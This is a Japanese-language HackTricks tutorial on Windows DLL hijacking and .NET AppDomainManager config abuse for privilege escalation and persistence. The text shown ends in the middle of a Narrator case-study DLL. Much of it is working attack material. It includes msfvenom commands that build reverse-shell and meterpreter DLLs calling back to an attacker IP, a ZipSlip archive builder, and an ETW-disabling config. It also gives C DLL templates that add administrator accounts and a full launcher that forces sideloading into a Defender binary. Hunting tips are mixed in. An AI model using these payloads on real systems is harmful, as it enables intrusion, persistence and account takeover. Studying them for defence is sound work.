# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませる手法です。この用語には、**DLL Spoofing、Injection、Side-Loading** など、複数の手法が含まれます。主にコード実行や永続化の実現に利用され、権限昇格に使われることは比較的まれです。ここでは権限昇格に焦点を当てていますが、目的が異なっても hijacking の手法は同じです。

### よく使われる手法

DLL Hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL 読み込み方法によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 本物の DLL を悪意のある DLL に差し替える手法です。必要に応じて DLL Proxying を使い、元の DLL の機能を維持できます。
2. **DLL Search Order Hijacking**: アプリケーションの検索パターンを悪用し、正規の DLL よりも先に検索されるパスに悪意のある DLL を配置する手法です。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思わせて読み込ませるため、悪意のある DLL を作成する手法です。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメーターを変更し、アプリケーションを悪意のある DLL に誘導する手法です。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換える手法で、DLL side-loading と関連付けられることがよくあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリに悪意のある DLL を配置する手法です。Binary Proxy Execution の手法に似ています。

アプリケーションが**独自の DLL loader**を実装している場合もあります。特権プロセスが `Libraries` や `Plugins` などの子ディレクトリを列挙し、選択した DLL を helper に渡すことがあります。これは通常の Windows DLL 検索順序とは独立しています。別のアカウントがその特定のディレクトリにファイルを作成できる場合は、調査の手掛かりとして扱い、プロセスの実行ユーザー、ディレクトリに実際に適用される ACL、ファイルの選択ルール、そして DLL の読み込み処理に到達できるかを確認してください。実行ファイルの隣に書き込み可能なディレクトリがあるだけでは、そのプロセスがそこから DLL を読み込むことの証明にはなりません。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

従来の DLL sideloading だけが、信頼された **.NET Framework** プロセスに攻撃者のコードを読み込ませる方法ではありません。対象の実行ファイルが**マネージド**アプリケーションの場合、CLR は実行ファイル名に基づく**アプリケーション構成ファイル**（例: `Setup.exe.config`）も参照します。このファイルでは独自の **AppDomainManager** を定義できます。設定ファイルが EXE と同じ場所にある攻撃者が制御するアセンブリを指定している場合、CLR は**アプリケーションの通常のコードパスより前に**そのアセンブリを読み込み、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework 構成スキーマによると、独自の manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小限のマネージャー:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

実践上の注意:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL search order ではなく、CLR config parsing に依存します。
- ホストは実際に **managed EXE** である必要があります。簡易確認には `sigcheck -m target.exe`、`corflags target.exe` を使うか、PE metadata の **CLR Runtime Header** を確認します。
- config ファイル名は実行ファイル名と完全に一致する必要があり（`<binary>.config`）、通常は **EXE の隣**に配置します。
- これは **署名済みの Microsoft/vendor binary** で有効です。信頼された EXE は変更せず、悪意のある managed assembly をプロセス内で実行できます。
- 書き込み可能な installer/update ディレクトリがすでにある場合、AppDomainManager hijacking を **第1段階**として使い、その後の段階で classic DLL sideloading や reflective loading を行えます。

### downloader + scheduled-task bootstrap としての AppDomainManager

実践的な侵入パターンでは、信頼された managed EXE と、**小さな bootstrapper** としてのみ動作する悪意のある `*.config` および悪意のある AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` のようなもっともらしい場所から、署名済みの .NET installer または updater を起動します。
2. 隣接する config によって、正規アプリのロジックが開始する**前に** CLR が攻撃者の assembly を読み込みます。
3. 悪意のある manager が **path gate** を実行します（たとえば、ホスト EXE が `Downloads` から実行されている場合のみ続行し、第2段階は `%LOCALAPPDATA%` から実行する場合のみ許可します）。
4. チェックを通過すると、payload 本体を `%LOCALAPPDATA%\PerfWatson2.exe` のようなユーザーが書き込み可能なパスにダウンロードし、scheduled task で persistence を設定します。

この変種が重要な理由:
- 署名済みホスト EXE は変更されないため、メイン binary の hash だけを確認する triage では侵害を見逃す可能性があります。
- 単純な **path-based anti-analysis** はよく使われます。ZIP/EXE/DLL の3点セットを Desktop、Temp、または sandbox path に移動すると、意図的に chain が機能しなくなることがあります。
- 第1段階の AppDomainManager DLL は小さく目立たないままにし、実際の implant は後から取得できます。

このパターンでよく見られる最小限の persistence の例:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- `/rl highest` は、そのユーザー/セッションで**利用可能な最高レベル**を意味し、それ自体で SYSTEM への昇格が保証されるわけではありません。
- この手法は、従来の DLL 不在による検索順序 hijacking というより、**.NET config abuse による実行/永続化**として分類するほうが適切な場合が多いですが、攻撃者は両者を頻繁に組み合わせます。

検出の手がかり:
- **ZIP 展開先のパス**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動された、**同じディレクトリに** `<exe>.config` がある署名済み .NET 実行ファイル。
- アクションの実行先が `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` 配下で、名前がブラウザーやベンダーのアップデーターを模倣している新しいスケジュールタスク。
- 別の EXE を直ちにダウンロードし、その後 `schtasks.exe` を起動する、短時間だけ動作するマネージド bootstrap プロセス。
- 実行ファイルのパスが想定されたユーザープロファイルのディレクトリと一致しないと、早期終了するサンプル。

### 既存のスケジュールタスクを hijack して sideload chain を再起動する

永続化を調べる際は、**新しいタスクの作成**だけに注目しないでください。一部の侵入グループは、正規のインストーラーが**通常のアップデータータスク**を作成するまで待ち、その後、タスクのアクションを**書き換え**ます。これにより、既存の名前、作成者、トリガーが維持され、ディフェンダーには見慣れたものに見えます。

再利用可能なワークフロー:
1. 正規のソフトウェアをインストール/実行し、通常作成されるタスクを特定します。
2. タスク XML をエクスポートし、現在の `<Exec><Command>` / `<Arguments>` の値を記録します。<sup>[[23]](#references)</sup>
3. アクションだけを置き換え、ユーザーが書き込み可能なステージングディレクトリにある**信頼できるホスト EXE**をタスクで起動するようにします。その EXE が実際のペイロードを side-load または AppDomain-load します。
4. 目立つ永続化の痕跡を新たに作成する代わりに、同じタスク名で再登録します。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

なぜよりステルス性が高いのか:
- タスク名は、ベンダーのアップデーターなど、もっともらしく見せることができます。
- **Task Scheduler service** が起動するため、親プロセスや祖先プロセスの検証では、`explorer.exe` ではなく、想定どおりのスケジューリングの系統が見えることがよくあります。
- **新しいタスク名** だけを探す DFIR チームは、登録済みのタスクのアクションが `%LOCALAPPDATA%`、`%APPDATA%`、その他の攻撃者が制御するパスを指すように変更されていても、見逃す可能性があります。

すばやく調査するための手掛かり:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` のメタデータをベースラインと比較します。
- **ベンダー製に見えるアップデータータスク** が **ユーザーが書き込み可能なディレクトリ** から実行される場合や、同じ場所にある `*.config` ファイルを伴う .NET EXE を起動する場合にアラートを出します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に組み合わせた手順については、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 見つからない DLL の特定

システム内で見つからない DLL を探す最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を起動し、**次の2つのフィルターを設定する**ことです。

![一般的な手法 - 見つからない DLL の特定: システム内で見つからない DLL を探す最も一般的な方法は、sysinternals の procmon を起動し、次の2つのフィルターを設定することです](<../../../images/image (961).png>)

![一般的な手法 - 見つからない DLL の特定: システム内で見つからない DLL を探す最も一般的な方法は、sysinternals の procmon を起動し、次の2つのフィルターを設定することです](<../../../images/image (230).png>)

次に、**File System Activity** だけを表示します。

![一般的な手法 - 見つからない DLL の特定: File System Activity だけを表示する](<../../../images/image (153).png>)

**一般的に見つからない DLL** を探している場合は、これを**数秒間**実行したままにします。\
**特定の実行ファイル内で見つからない DLL** を探す場合は、**"Process Name" "contains" `<exec name>`** などのフィルターを追加し、その実行ファイルを起動してから、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 見つからない DLL の悪用

権限昇格するには、**特権プロセスが書き込み可能な場所から読み込もうとする DLL** を探します。正規の DLL が置かれたディレクトリよりも先に検索されるディレクトリを制御できる場合や、要求された DLL が存在せず、検索対象ディレクトリのいずれかに書き込める場合に、これが可能になります。

### DLL 検索順序

[**Microsoft のドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、DLL が具体的にどのように読み込まれるかを確認できます。**

**Windows アプリケーション**は、**事前に定義された検索パス**を決められた順序でたどり、DLL を探します。DLL hijacking は、悪意のある DLL をこれらのディレクトリのいずれかに戦略的に配置し、正規の DLL より先に読み込ませることで発生します。これを防ぐには、必要な DLL を参照するときに、アプリケーションが絶対パスを使うようにします。

以下に、**32-bit** システムでの **DLL 検索順序**を示します。

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使います。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windows ディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使います。
   1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH 環境変数に記載されたディレクトリ。**App Paths** レジストリキーで指定されたアプリケーションごとのパスは含まれない点に注意してください。DLL の検索パスの計算時に、**App Paths** キーは使われません。

これは、**SafeDllSearchMode** が有効な場合の**既定の**検索順序です。無効にすると、現在のディレクトリは2番目に繰り上がります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成して、0 に設定します（既定では有効です）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼び出されると、検索は **LoadLibraryEx** が読み込む実行可能モジュールのディレクトリから始まります。

最後に、DLL は名前ではなく絶対パスで読み込むこともできます。この場合、Windows は DLL 自体については指定されたパスだけを検索します。名前で要求された依存関係には、引き続き該当する検索順序が適用されます。

検索順序を変更する方法は他にもありますが、ここでは説明しません。

### 任意のファイル書き込みを見つからない DLL の hijack に連鎖させる

**関連する手法:** [特権 remediation を対象とした oplock ゲート付き mount-point 切り替え](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation)。

1. **ProcMon** のフィルター（`Process Name` = 対象 EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使い、プロセスが見つけられずに検索している DLL 名を収集します。<sup>[[14]](#references)</sup>
2. バイナリが**スケジュールまたはサービス**で実行される場合、該当する名前の DLL を**アプリケーションディレクトリ**（検索順序の #1）に置けば、次回の実行時に読み込まれます。ある .NET scanner の例では、プロセスは本物のコピーを `C:\Program Files\dotnet\fxr\...` から読み込む前に、`C:\samples\app\` 内で `hostfxr.dll` を探していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. プリミティブが **ZipSlip 型の任意書き込み**の場合、展開ディレクトリから抜け出して DLL がアプリケーションフォルダーに配置される ZIP を作成します:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. アーカイブを監視対象の inbox/share に配置します。スケジュールされたタスクがプロセスを再起動すると、悪意のある DLL が読み込まれ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新しく作成するプロセスの DLL 検索パスに確実に影響を与える高度な方法として、ntdll のネイティブ API でプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定する方法があります。攻撃者が制御するディレクトリをここに指定すると、インポートした DLL を名前で解決する（絶対パスを使わず、安全な読み込みフラグも使わない）対象プロセスに、そのディレクトリから悪意のある DLL を読み込ませることができます。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメーターを構築し、制御下のフォルダー（例：dropper/unpacker があるディレクトリ）を指すカスタム DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。対象バイナリが DLL を名前で解決すると、ローダーは解決時に指定された DllPath を参照するため、悪意のある DLL を対象の EXE と同じ場所に置かなくても、確実に sideloading を実行できます。

Notes/limitations
- これは作成する子プロセスに影響します。現在のプロセスだけに影響する SetDllDirectory とは異なります。
- 対象は DLL を名前でインポートするか、LoadLibrary を使う必要があります（絶対パスを使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使わないこと）。
- KnownDLLs とハードコードされた絶対パスは hijack できません。転送されたエクスポートや SxS によって優先順位が変わる場合があります。

最小限の C の例（ntdll、ワイド文字列、エラー処理は簡略化）:

<details>
<summary>完全な C の例: RTL_USER_PROCESS_PARAMETERS.DllPath による DLL sideloading の強制</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

運用上の使用例
- 必要な関数をエクスポートするか、実際のDLLにプロキシする悪意あるxmllite.dllを、DllPathディレクトリに配置します。
- 上記の手法を使ってxmllite.dllを名前で検索することが知られている署名済みバイナリを起動します。ローダーは指定されたDllPath経由でインポートを解決し、DLLをサイドロードします。

この手法は実環境で、複数段階のサイドロードチェーンを実行するために使われたことが確認されています。最初のランチャーがヘルパーDLLをドロップし、そのDLLがカスタムDllPathを指定して、乗っ取り可能なMicrosoft署名済みバイナリを起動します。これにより、ステージングディレクトリにある攻撃者のDLLを強制的に読み込ませます。<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking による `.exe.config` の悪用

**.NET Framework** の対象では、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリをパッチせずに **`Main()` の実行前**にサイドロードできます。Win32 DLLの検索順序だけに頼るのではなく、攻撃者は正規の.NET EXEと悪意ある設定ファイル、および攻撃者が制御する1つ以上のアセンブリを同じ場所に配置します。

チェーンの仕組み:<sup>[[15]](#references)[[22]](#references)</sup>
1. ホストEXEが起動し、**CLRが `<exe>.config` を読み込みます**。
2. 設定ファイルで **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を指定し、ランタイムに攻撃者が制御する `AppDomainManager` をインスタンス化させます。
3. 悪意あるマネージャーにより、信頼されたホストプロセス内で **`Main()` の実行前にコードを実行**できます。
4. 同じ設定ファイルで、CLRがまずローカルアセンブリ（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を解決するよう強制できます。また、インラインパッチを使わずにランタイムの検証やテレメトリーを弱体化できます。

キャンペーンで見られるパターン（ディレクティブやCLRのバージョンによって、正確なネスト構造は異なる場合があります）:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

有用な理由:
- **`<probing privatePath="."/>`** はアセンブリの解決先をアプリケーションディレクトリ内に限定し、そのフォルダーを予測可能な sideloading の標的にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR の初期化中に実行を攻撃者のコードへ移し、正規のアプリケーションロジックが実行される前に動作します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリが strong name の検証エラーを起こさずに、署名されていないアセンブリや改ざんされたアセンブリを読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、publisher policy による新しいアセンブリへのリダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は、ランタイム選択をより予測可能にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に注目すべき設定です。インプラントがメモリ内で `EtwEventWrite` にパッチを当てるのではなく、設定によって **CLR 自身が ETW による可視性を無効化**します。

最近のキャンペーンで確認された実行パターン:
- ステージ 1 では `setup.exe`、`setup.exe.config`、ローカルアセンブリを配置します。
- ステージ 2 では、それらを本物らしい **AppData の更新用**フォルダーにコピーし、ホストの名前を `update.exe` のように変更して、**scheduled task** で再起動します。
- ステージ 3 では、最終的な RAT DLL/export を読み込む前に、実行コンテキスト（たとえば、Task Scheduler からの想定される親プロセス `svchost.exe`）を確認します。

ハンティングのヒント:
- 書き込み可能なユーザー領域で、不審な隣接 **`.config`** ファイルとともに実行されている、署名済みまたは正規の **.NET 実行ファイル**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、**`etwEnable enabled="false"`** を含む **`.config`** ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリから、名前を変更した更新用バイナリを再起動する scheduled task。
- scheduled task が信頼された .NET ホストを起動し、そのホストが直ちに自身のディレクトリからベンダー製ではないアセンブリを読み込む親子プロセスの連鎖。

#### Windows ドキュメントに記載された DLL 検索順序の例外

Windows のドキュメントには、標準 DLL 検索順序に対する特定の例外が記載されています。

- **メモリにすでに読み込まれている DLL と同じ名前の DLL** が見つかった場合、システムは通常の検索を行いません。代わりに、リダイレクトとマニフェストを確認してから、メモリ内にある DLL を使用します。**この場合、システムは DLL を検索しません**。
- 現在の Windows バージョンで **既知の DLL** と認識されている場合、システムはその既知の DLL のバージョンと依存 DLL を使用し、**検索処理を省略します**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの既知の DLL の一覧が格納されています。
- **DLL に依存関係がある場合**、依存 DLL の検索は、最初の DLL がフルパスで特定されたかどうかにかかわらず、それらが **モジュール名だけで指定された**ものとして行われます。

### 権限昇格

**要件**:

- **異なる権限**で動作中、または動作する予定の（horizontal movement または lateral movement）**DLL が不足している**プロセスを特定する。
- **DLL** の検索対象となるいずれかの **ディレクトリ**への**書き込みアクセス**を確保する。この場所は、実行ファイルのディレクトリやシステムパス内のディレクトリである可能性があります。

これらの前提条件がデフォルトで揃うことはまれです。権限の高い実行ファイルに不足した DLL 依存関係があることは通常なく、標準ユーザーは通常、システムの検索パス内のディレクトリに書き込めません。ただし、設定ミスのある環境では、両方の条件が揃う可能性があります。\
要件を満たす場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してください。主な目的は UAC bypass ですが、特定の Windows バージョン向けの DLL-hijacking PoC が含まれており、見つけた書き込み可能なディレクトリに合わせて応用できる場合があります。

次の方法で**フォルダーの権限を確認**できます。<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

また、**PATH 内のすべてのフォルダーのアクセス権を確認します**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

また、次の方法で実行ファイルのインポートと DLL のエクスポートを確認することもできます。

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path folder**への書き込み権限を使って**DLL Hijackingを悪用し、権限昇格する**方法の完全なガイドは、こちらを確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内のフォルダに書き込み権限があるかどうかを確認します。\
この脆弱性を発見するためのその他の便利な自動化ツールには、**PowerSploit functions**の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### 例

悪用可能なシナリオを発見した場合、悪用を成功させるために最も重要なことの1つは、**実行ファイルがそのDLLからインポートするすべての関数をエクスポートするDLLを作成すること**です。いずれにしても、DLL Hijackingは、[Medium Integrity levelからHighへ**権限昇格する（UACをバイパスする）**](../../authentication-credentials-uac-and-efs/index.html#uac)場合や、[**High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)**権限昇格する**場合に便利です。DLL Hijackingを実行するための**有効なDLLの作成方法**は、DLL hijacking for executionに焦点を当てたこちらの調査で確認できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**には、**テンプレート**として、または不要な関数をエクスポートする**DLLの作成**に利用できる**基本的なDLLコード**があります。

## **DLLの作成とコンパイル**

### **DLLのプロキシ化**

基本的に、**DLL proxy**とは、**ロード時に悪意のあるコードを実行できる**だけでなく、**実際のライブラリにすべての呼び出しを中継することで**、期待どおりに**公開**して**動作**するDLLです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使えば、実行ファイルとプロキシ化するライブラリを指定して**プロキシ化されたDLLを生成**したり、DLLを指定して**プロキシ化されたDLLを生成**したりできます。

### **Meterpreter**

**rev shellの取得（x64）:**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter（x86）を取得する:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**ユーザーを作成する（x86。x64版は見つかりませんでした）：**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自作

多くの場合、コンパイルする DLL は **victim process がインポートするすべての関数を export する必要があります**。必要な export が不足していると、binary が関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL テンプレート (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>ユーザー作成を行う C++ DLL の例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>スレッドエントリを持つ別のC DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (アクセシビリティ/AT)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き探します。この DLL を hijack すると、任意のコード実行と永続化が可能です。<sup>[[7]](#references)</sup>

主な事実
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に攻撃者が制御する書き込み可能な DLL が存在すると、読み込まれて `DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。

Procmon での検出
- フィルター: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記パスへの読み込み試行を確認します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
